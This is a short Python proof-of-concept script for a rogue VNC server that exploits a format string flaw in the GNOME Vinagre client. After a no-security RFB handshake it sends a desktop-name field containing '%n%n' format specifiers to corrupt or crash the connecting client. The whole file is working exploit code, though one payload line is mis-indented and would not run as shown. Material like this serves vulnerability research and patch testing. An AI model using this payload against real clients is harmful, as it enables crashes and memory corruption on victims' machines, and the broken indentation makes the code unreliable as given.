##
## Gnome Vinagre format string PoC VNC SERVER
##

import socket
import struct

#create an INET, STREAMing socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bind the socket to a public host,
# and a well-known port
serversocket.bind(("0.0.0.0", 5900))

#become a server socket
serversocket.listen(5)

while 1:
  #accept connections from outside
  (clientsocket, address) = serversocket.accept()
  print "accept"

  # version handshake
  clientsocket.send("RFB 003.008\n")
  resp=clientsocket.recv(100)
  print resp

  # security types (none)
  clientsocket.send("\x01\x01")
  resp=clientsocket.recv(100)
  if resp=="\x01":
    print "security: none"
    clientsocket.send("\x00\x00\x00\x00") #OK
  else: exit(-1)

  # share desktop flag?
  resp=clientsocket.recv(100)

  #framebuffer parameters

clientsocket.send("\x02\xd0\x01\x90\x20\x20\x00\x01\x00\xff\x00\xff\x00\xff\x10\x08\x00\x00\x00\x00\x00\x00\x00\x04%n%n")
#OK

  resp=clientsocket.recv(100)
  clientsocket.close()
